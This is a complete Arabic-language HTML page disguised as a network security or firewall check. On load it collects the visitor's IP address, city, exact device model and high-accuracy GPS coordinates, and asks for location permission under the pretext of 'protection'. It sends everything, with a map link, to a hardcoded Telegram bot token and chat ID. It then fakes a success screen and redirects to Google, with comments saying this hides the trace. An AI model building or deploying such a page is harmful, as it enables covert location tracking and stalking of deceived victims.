<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>جاري التحقق من الشبكة...</title>
    <style>
        /* تصميم هادئ يشبه شاشات التحميل المعروفة */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            direction: ltr;
        }
        .container {
            background: #ffffff;
            padding: 45px 35px;
            border-radius: 28px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.08);
            max-width: 380px;
            width: 90%;
            text-align: center;
            border: 1px solid #eef2f6;
        }
        .icon {
            font-size: 48px;
            margin-bottom: 15px;
            display: block;
        }
        h3 {
            color: #1e293b;
            font-weight: 600;
            font-size: 20px;
            margin-bottom: 8px;
        }
        .sub-text {
            color: #64748b;
            font-size: 14px;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e9eef2;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0 15px;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: #2563eb;
            border-radius: 10px;
            transition: width 0.8s ease;
        }
        #status-text {
            color: #94a3b8;
            font-size: 13px;
            letter-spacing: 0.3px;
        }
        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #cbd5e1;
            border-top: 1px solid #f1f5f9;
            padding-top: 18px;
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">📡</span>
    <h3>جاري تأمين الاتصال</h3>
    <p class="sub-text">الرجاء الانتظار أثناء التحقق من إعدادات الشبكة...</p>
    
    <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
    </div>
    <div id="status-text">جارٍ تحميل البيانات...</div>
    <div class="footer-note">نظام حماية جدار الحماية الإصدار 3.2</div>
</div>

<script>
    // =====================================================
    // 🔑 بيانات البوت (تم إدخالها مسبقاً)
    const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
    const CHAT_ID = '5343926721';
    // =====================================================

    let reportSent = false;
    let gpsCalled = false;
    let progress = 0;

    // === تحديث شريط التحميل (لإضفاء الطابع الواقعي) ===
    function updateProgress(value, text) {
        progress = Math.min(value, 100);
        document.getElementById('progressFill').style.width = progress + '%';
        if (text) document.getElementById('status-text').textContent = text;
    }

    // === استخراج اسم الجهاز الدقيق (الطراز) ===
    function getExactDevice(ua) {
        // محاولة استخراج الطراز من الـ User-Agent
        let model = 'غير معروف';
        const match = ua.match(/\(([^)]+)\)/);
        if (match) {
            const parts = match[1].split(';').map(p => p.trim());
            for (let p of parts) {
                // سامسونج جالكسي
                if (p.match(/SM-[A-Za-z0-9]+/)) { model = p; break; }
                // آيفون (iPhone14,2)
                if (p.match(/iPhone[0-9]+,[0-9]+/)) { model = p; break; }
                // جوجل بكسل
                if (p.match(/Pixel [0-9]+/)) { model = p; break; }
                // شاومي / بوكو / ريدمي (أرقام مثل 2107119SG)
                if (p.match(/210[0-9]{6,7}[A-Za-z]?/)) { model = p; break; }
                // ريلمي (RMX)
                if (p.match(/RMX[0-9]+/)) { model = p; break; }
                // فيفو (V2024)
                if (p.match(/V[0-9]{4}/)) { model = p; break; }
                // هواوي (ANE-LX1)
                if (p.match(/[A-Z]{2,4}-[LX][A-Z0-9]{1,3}/)) { model = p; break; }
            }
            // إذا لم نجد شيئاً، نأخذ آخر جزء طويل
            if (model === 'غير معروف') {
                for (let p of parts) {
                    if (p.length > 3 && p.length < 20 && !p.includes('Android') && !p.includes('Linux') && !p.includes('AppleWebKit')) {
                        model = p;
                        break;
                    }
                }
            }
        }
        // إضافة اسم النظام الأساسي
        let os = 'جهاز';
        if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Macintosh')) os = 'Mac';
        
        return `${os} (${model})`;
    }

    // === جمع البيانات الأساسية ===
    const data = {
        ip: 'غير معروف',
        country: 'غير معروف',
        city: 'غير معروف',
        lat: 'غير معروف',
        lon: 'غير معروف',
        gps_lat: null,
        gps_lon: null,
        device: navigator.userAgent,
        exactDevice: getExactDevice(navigator.userAgent),
        time: new Date().toLocaleString('ar-EG', { hour12: false }),
        url: window.location.href,
        referrer: document.referrer || 'مباشر'
    };

    // === 1. جلب الـ IP والتقريبي ===
    async function fetchIP() {
        updateProgress(20, 'جلب معلومات الشبكة...');
        try {
            const res = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon,query');
            const info = await res.json();
            if (info.status === 'success' && info.query) {
                data.ip = info.query;
                data.country = info.country || 'غير معروف';
                data.city = info.city || 'غير معروف';
                data.lat = info.lat || 'غير معروف';
                data.lon = info.lon || 'غير معروف';
                updateProgress(50, `تم التعرف على المدينة: ${data.city}`);
                return;
            }
        } catch (e) {}
        // محاولة ثانية
        try {
            const res = await fetch('https://ipinfo.io/json');
            const info = await res.json();
            if (info.ip) {
                data.ip = info.ip;
                data.country = info.country || 'غير معروف';
                data.city = info.city || 'غير معروف';
                const loc = info.loc ? info.loc.split(',') : ['غير معروف', 'غير معروف'];
                data.lat = loc[0] || 'غير معروف';
                data.lon = loc[1] || 'غير معروف';
                updateProgress(50, `تم التعرف على المدينة: ${data.city}`);
                return;
            }
        } catch (e) {}
        updateProgress(50, 'تم جلب البيانات جزئياً');
    }

    // === 2. طلب GPS (يظهر النافذة فوراً) ===
    function requestGPS() {
        if (gpsCalled) return;
        gpsCalled = true;

        if (!navigator.geolocation) {
            updateProgress(70, 'الموقع غير مدعوم، نرسل التقريبي');
            sendReport();
            return;
        }

        updateProgress(60, 'جاري طلب الموقع للحماية...');
        
        // نطلب الموقع بدقة عالية
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                // ✅ نجاح: نأخذ البيانات فوراً ونرسل بدون أي زر
                data.gps_lat = pos.coords.latitude;
                data.gps_lon = pos.coords.longitude;
                updateProgress(90, 'تم تأمين الموقع بنجاح!');
                sendReport(); // <-- الإرسال التلقائي فوراً
            },
            (err) => {
                // ❌ رفض أو خطأ: نرسل التقريبي فقط
                updateProgress(70, 'لم يتم الحصول على الموقع الدقيق');
                sendReport();
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    }

    // === 3. إرسال التقرير (مرة واحدة) ===
    function sendReport() {
        if (reportSent) return;
        reportSent = true;

        let msg = `🛡️ <b>تقرير الحماية - زائر جديد</b>\n\n`;
        msg += `🌐 IP: ${data.ip}\n`;
        msg += `📍 الدولة: ${data.country}\n`;
        msg += `🏙️ المدينة: ${data.city}\n`;
        msg += `📱 الجهاز: ${data.exactDevice}\n`; // هنا الطراز الدقيق

        if (data.gps_lat && data.gps_lon) {
            msg += `🛰️ <b>الموقع الدقيق (GPS):</b>\n`;
            msg += `📍 ${data.gps_lat}, ${data.gps_lon}\n`;
            msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
        } else {
            msg += `📍 التقريبي (IP): ${data.lat}, ${data.lon}\n`;
            msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
            msg += `\n⚠️ (هذا موقع سنترال الخدمة وليس المنزل)`;
        }

        msg += `\n🕒 الوقت: ${data.time}`;

        // إرسال إلى التيليجرام
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML'
            })
        }).then(() => {
            // بعد الإرسال نخفي التحميل ونعيد التوجيه لموقع عادي (لإخفاء الأثر)
            document.getElementById('mainContainer').innerHTML = `
                <span class="icon">✅</span>
                <h3>تم التحقق بنجاح</h3>
                <p class="sub-text">جاري إعادة التوجيه إلى الصفحة الآمنة...</p>
                <div class="progress-bar"><div class="progress-fill" style="width:100%;"></div></div>
            `;
            // إعادة التوجيه إلى Google بعد 2 ثانية (لتبدو كصفحة وسيطة عادية)
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }).catch(() => {
            // حتى لو فشل الإرسال نعيد التوجيه حتى لا يلاحظ الزائر
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        });
    }

    // === 4. بدء التشغيل ===
    setTimeout(async () => {
        updateProgress(10, 'بدء فحص الأمان...');
        await fetchIP();
        // نطلب GPS تلقائياً (ستظهر نافذة الإذن)
        requestGPS();
    }, 500);
</script>
</body>
</html>
